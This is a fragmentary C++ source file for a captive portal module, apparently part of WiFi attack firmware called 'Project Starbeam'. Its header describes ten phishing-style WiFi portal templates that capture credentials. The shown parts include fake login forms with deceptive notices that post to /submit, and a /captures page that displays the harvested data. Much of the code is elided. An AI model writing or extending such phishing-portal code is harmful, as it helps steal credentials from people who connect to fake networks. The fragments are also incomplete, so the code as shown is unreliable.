// captive_portal.cpp - Captive Portal Module for Project Starbeam V2
// Ported from cypherbox/src/captive_portal.cpp
// 10 phishing-style WiFi portal templates with credential capture (RAM-only, no SD)
...
<div class='warning'>Unauthorized access is monitored.</div>
<form action='/submit' method='POST'>
...
<div class='notice'>Verify info for network access</div>
<form action='/submit' method='POST'>
...
void CaptivePortal::setupRoutes() {
    ...
    cpServer->on("/captures", HTTP_GET, []() {
        ...
        html += "<h2>Captured Data (" + String(TMPL_NAMES[CaptivePortal::activeTemplate]) + ")</h2>";
        html += "<p>Total: <strong>" + String(CaptivePortal::captureCount) + "</strong></p>";
